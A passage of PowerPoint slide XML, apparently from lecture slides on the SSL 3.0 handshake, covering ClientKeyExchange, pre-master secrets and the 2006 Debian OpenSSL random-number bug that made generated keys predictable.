                  <a:pt x="512999" y="607498"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="461849" y="596720"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="412891" y="585366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="366214" y="573458"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="321906" y="561016"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280057" y="548062"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240754" y="534618"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="204086" y="520705"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="139011" y="491561"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85540" y="460800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44381" y="428595"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16242" y="395120"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="342899"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="2857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650535" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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5F0117C6-62C9-4ED9-9051-3D0F09E243C2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24134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ClientKeyExchange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76364742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168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4437346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47040608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172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2686284" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3592440" y="3505320"/>
            <a:ext cx="3265560" cy="151920"/>
            <a:chOff x="3592440" y="3505320"/>
            <a:chExt cx="3265560" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="175" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3677040" y="35812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object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3592440" y="35053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90244152" name="object 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1988640" y="1834920"/>
            <a:ext cx="4877640" cy="1991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07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C,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suites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c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50760">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc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54"/>
              </a:spcBef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132000">
              <a:lnSpc>
                <a:spcPct val="119000"/>
              </a:lnSpc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 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certificate, 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ServerHelloDone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82947662" name="object 14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179" name="object 15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object 16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29727581" name="object 17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7899643" name="object 18"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1905120" y="4443480"/>
            <a:ext cx="4723920" cy="1652400"/>
            <a:chOff x="1905120" y="4443480"/>
            <a:chExt cx="4723920" cy="1652400"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="183" name="object 19"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1905120" y="4523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59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object 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4812840" y="444744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2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="613" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254304" y="75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object 21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2133720" y="4443480"/>
              <a:ext cx="4495320" cy="1652400"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4495320"/>
                <a:gd name="textAreaRight" fmla="*/ 4495680 w 4495320"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1652400"/>
                <a:gd name="textAreaBottom" fmla="*/ 1652760 h 1652400"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4495800" h="1652904" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="974733" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="749300" y="509583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="509583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1652583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4495798" y="1652583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4495798" y="509583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1873248" y="509583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97473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object 22"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2133720" y="4443480"/>
              <a:ext cx="4495320" cy="1652400"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4495320"/>
                <a:gd name="textAreaRight" fmla="*/ 4495680 w 4495320"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1652400"/>
                <a:gd name="textAreaBottom" fmla="*/ 1652760 h 1652400"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4495800" h="1652904" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="509583"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="749299" y="509583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="974733" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1873249" y="509583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4495798" y="509583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4495798" y="700083"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4495798" y="985833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4495798" y="1652583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1873249" y="1652583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="749299" y="1652583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1652583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="985833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="700083"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="509583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40531374" name="object 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2029680" y="4147920"/>
            <a:ext cx="17096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ClientKeyExchange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318104" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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C7293871-71FC-4861-AE3E-5E6D9C797C22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447901" name="object 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2212200" y="4938840"/>
            <a:ext cx="4176000" cy="1302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280" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12600">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="65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generates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secret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material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1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sends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it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encrypted</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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with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(if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RSA)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226181" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1558080"/>
            <a:ext cx="7944120" cy="2783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22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08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struct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{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45960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="315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select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(KeyExchangeAlgorithm)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{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79320">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="34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case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rsa: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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>EncryptedPreMasterSecret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79320">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="34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case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diffie_hellman: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ClientDiffieHellmanPublic;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45960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="34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}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exchange_keys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487326" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="3850920"/>
            <a:ext cx="3268080" cy="1585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}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ClientKeyExchange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9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struct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{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974458" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="269640" y="5372499"/>
            <a:ext cx="4838399" cy="8663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ProtocolVersion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-18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client_version;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432598" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="1139289" y="5786649"/>
            <a:ext cx="3616560" cy="13794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5800" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="345960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="43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opaque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random[46];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0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}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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>PreMasterSecret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95676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ClientKeyExchange</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-114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(RFC)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3068387" name="object 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4219560" y="5638680"/>
            <a:ext cx="3857760" cy="837720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 3857760"/>
              <a:gd name="textAreaRight" fmla="*/ 3858120 w 3857760"/>
              <a:gd name="textAreaTop" fmla="*/ 0 h 837720"/>
              <a:gd name="textAreaBottom" fmla="*/ 838080 h 837720"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="3858259" h="838200" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="809700" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1317700" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2079700" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3857700" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3857700" y="139699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3857700" y="349249"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3857700" y="838199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2079700" y="838199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1317700" y="838199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="809700" y="838199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="809700" y="349249"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="268298"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="809700" y="139699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="809700" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="28574">
            <a:solidFill>
              <a:srgbClr val="009192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3846609" name="object 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5108039" y="5671800"/>
            <a:ext cx="2852640" cy="920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480" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="55080" indent="-43200">
              <a:lnSpc>
                <a:spcPct val="91000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="264"/>
              </a:spcBef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Random</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-46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bits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-41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from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-46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21">
                <a:solidFill>
                  <a:srgbClr val="008080"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>which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symmetric</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-32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keys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-26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will</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-32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be</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-26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8080"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>derived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(by</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-21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hashing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-21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them</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="00808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8080"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="008080"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> nonces)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138914" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5054760" y="4110120"/>
            <a:ext cx="2628720" cy="1066680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFADD6"/>
          </a:solidFill>
          <a:ln w="952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91440">
              <a:lnSpc>
                <a:spcPts val="2761"/>
              </a:lnSpc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Where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do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 random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91440">
              <a:lnSpc>
                <a:spcPts val="2880"/>
              </a:lnSpc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bits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come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from?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054755" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6487200" y="4867200"/>
            <a:ext cx="132120" cy="771480"/>
            <a:chOff x="6487200" y="4867200"/>
            <a:chExt cx="132120" cy="771480"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="199" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6553080" y="4867200"/>
              <a:ext cx="1440" cy="7434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43400"/>
                <a:gd name="textAreaBottom" fmla="*/ 743760 h 743400"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1904" h="743585" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="1529" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="743169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00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6487200" y="5508360"/>
              <a:ext cx="132120" cy="130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48253542" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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86B1B587-6CEA-4F98-98D9-1B0EFD6302C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28654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Debian</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-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Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-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(2006-08)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7687572" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1556640"/>
            <a:ext cx="8222400" cy="5630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line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code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commented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out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md_rand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  <a:tab pos="4021560" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pP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MD_Update(&amp;m,buf,j);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	/*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purify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complains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*/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56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Without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this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line,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seed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pseudo-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random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generator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derived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only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process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ID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05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Default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maximum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Linux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=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32768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754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Result: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u="sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>all</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-6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keys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generated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Debian-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based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OpenSSL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package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2006-08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are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predictable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99000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="510"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Tahoma"/>
              <a:buChar char="•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MS PGothic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Affected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include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SSH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keys,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OpenVPN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keys,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DNSSEC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material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X.509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session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SSL/TLS connections</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”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1100570" name="object 4"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7621560" y="228600"/>
            <a:ext cx="1314000" cy="1447560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2110038789" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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4553DA49-A912-4FE6-81FF-4A910B6C8EA5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40653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MS PGothic"/>
              </a:rPr>
              <a:t>“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Core</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”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3.0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Handshake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11882372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208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25559031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2720659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212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4675958" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3668760" y="3352680"/>
            <a:ext cx="3265560" cy="151920"/>
            <a:chOff x="3668760" y="3352680"/>
            <a:chExt cx="3265560" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="215" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3753360" y="342900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object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3668760" y="33526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26603490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4154400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="267120" rIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="113364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C,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=3.0,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suites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N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-38" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>c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4279320" indent="0">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1746"/>
              </a:spcBef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=3.0,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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suite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N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-38" baseline="-25000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PK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-32" baseline="-25000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, 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ServerHelloDone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43566436" name="object 14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219" name="object 15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" name="object 16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23818785" name="object 17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0668853" name="object 18"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1905120" y="3861720"/>
            <a:ext cx="3161880" cy="151920"/>
            <a:chOff x="1905120" y="3861720"/>
            <a:chExt cx="3161880" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="223" name="object 19"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1905120" y="393732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59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object 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4812840" y="386172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26181270" name="object 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1737720" y="3538080"/>
            <a:ext cx="1239120" cy="312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{Secret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-15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}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-15" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>PKs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96742" name="object 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3212280" y="3589200"/>
            <a:ext cx="96552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if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using</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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26">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>RSA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518590" name="object 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1964520" y="4917240"/>
            <a:ext cx="2064600" cy="906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14999"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="99"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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switch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="165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165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keys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="165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derived </a:t>
            </a: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165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secret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1650" b="0" strike="noStrike" spc="-38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650" b="0" strike="noStrike" spc="-69" baseline="-250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65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N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1650" b="0" strike="noStrike" spc="-1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650" b="0" strike="noStrike" spc="-69" baseline="-250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65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N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1650" b="0" strike="noStrike" spc="-38" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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064479" name="object 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2215440" y="4100400"/>
            <a:ext cx="4185000" cy="955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976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471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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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share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71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secret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material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(secret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)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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this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point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548705" name="object 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5039640" y="4917240"/>
            <a:ext cx="2064600" cy="906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14999"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="99"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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switch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="165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165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keys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="165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derived </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1650" b="0" strike="noStrike" spc="-2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165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secret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1650" b="0" strike="noStrike" spc="-38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650" b="0" strike="noStrike" spc="-69" baseline="-250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65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N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1650" b="0" strike="noStrike" spc="-1" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1650" b="0" strike="noStrike" spc="-69" baseline="-250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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="165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50" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>N</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1650" b="0" strike="noStrike" spc="-38" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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1400860" name="object 26"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1905120" y="5715000"/>
            <a:ext cx="3290400" cy="151920"/>
            <a:chOff x="1905120" y="5715000"/>
            <a:chExt cx="3290400" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="231" name="object 27"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1905120" y="5791320"/>
              <a:ext cx="3206519" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3206520"/>
                <a:gd name="textAreaRight" fmla="*/ 3206880 w 32065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06750" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3206220" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="507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object 28"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4941720" y="571500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0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="101600" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2540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76355183" name="object 29"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3973680" y="6248520"/>
            <a:ext cx="3265560" cy="151920"/>
